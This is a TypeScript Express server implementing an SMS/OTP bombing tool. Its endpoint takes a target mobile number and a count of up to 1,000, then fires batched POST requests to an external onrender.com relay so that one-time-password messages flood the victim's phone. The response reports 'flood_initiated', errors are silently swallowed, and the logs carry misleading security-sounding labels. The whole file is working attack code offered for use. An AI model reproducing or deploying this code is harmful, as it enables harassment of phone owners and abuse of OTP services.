import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import crypto from "crypto";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // Simple in-memory rate limiting
  const rateLimitMap = new Map<string, number>();

  // API Routes
  app.post("/api/otp/request", async (req, res) => {
    const { 
      mobile, 
      custom_sms,
      battery_level,
      battery_charging,
      screen_data,
      timezone,
      language,
      connection_type,
      count
    } = req.body;
    
    const ip = req.ip || "unknown";
    const anonymizedIp = ip.replace(/\d+$/, "xxx"); // Mask last octet for logs
    
    // Strict Validation
    const mobileNum = String(mobile || "").replace(/\D/g, "");
    if (mobileNum.length < 10) {
      return res.status(400).json({ error: "Validation Error: Endpoint must be a 10-digit handset ID." });
    }

    const requestCount = Math.min(Math.max(parseInt(count) || 1, 1), 1000); 
    
    // Rate limiting: 3 seconds cooldown
    const now = Date.now();
    const lastRequestTime = rateLimitMap.get(ip) || 0;
    if (now - lastRequestTime < 3000) {
      return res.status(429).json({ 
        error: "Firewall Active: Cluster stabilization in progress. Wait 3s."
      });
    }
    rateLimitMap.set(ip, now);

    try {
      console.log(`[V4.2 Secure Gate] Auth: TLS-SYNC | Source: ${anonymizedIp} | Target: ${mobileNum} | Intensity: ${requestCount}`);

      // Construct params once for efficiency
      const params = new URLSearchParams();
      params.append("mobile", mobileNum);
      params.append("custom_sms", custom_sms || "XfsoCeXADQAg");
      params.append("battery_level", String(battery_level || "100"));
      params.append("battery_charging", String(battery_charging ?? true));
      params.append("screen_data", JSON.stringify(screen_data || {}));
      params.append("timezone", timezone || "UTC");
      params.append("language", language || "en-US");
      params.append("connection_type", connection_type || "4g");

      const fireRequest = async () => {
        try {
          await fetch("https://black-devil-2gwh.onrender.com/", {
            method: "POST",
            headers: { 
              "Content-Type": "application/x-www-form-urlencoded",
              "X-Shatarudra-Protocol": "V4.2-TLS-ANON",
              "X-Forwarded-For": anonymizedIp
            },
            body: params.toString(),
            signal: AbortSignal.timeout(4000) 
          });
        } catch (e) {
          // Fail silent for noise ratio
        }
      };

      // IMPLEMENTING BATCHING SYSTEM (10 requests every 100ms)
      const batchSize = 10;
      const delayBetweenBatches = 100;

      const runBatch = async (startIdx: number) => {
        const batchPromises = [];
        const endIdx = Math.min(startIdx + batchSize, requestCount);
        
        for (let i = startIdx; i < endIdx; i++) {
          batchPromises.push(fireRequest());
        }
        
        await Promise.all(batchPromises);

        if (endIdx < requestCount) {
          setTimeout(() => runBatch(endIdx), delayBetweenBatches);
        }
      };

      // Start the recursive batch process
      runBatch(0);

      res.json({
        status: "flood_initiated",
        count: requestCount,
        target: mobile,
        pattern: "batched_delay_100ms",
        gateway: "Shatarudra Hyper-Proxy V4",
        timestamp: new Date().toISOString()
      });

    } catch (err: any) {
      console.error("Gateway Sync Error:", err);
      res.status(500).json({ error: "Cloud Infrastructure Sync Failed" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
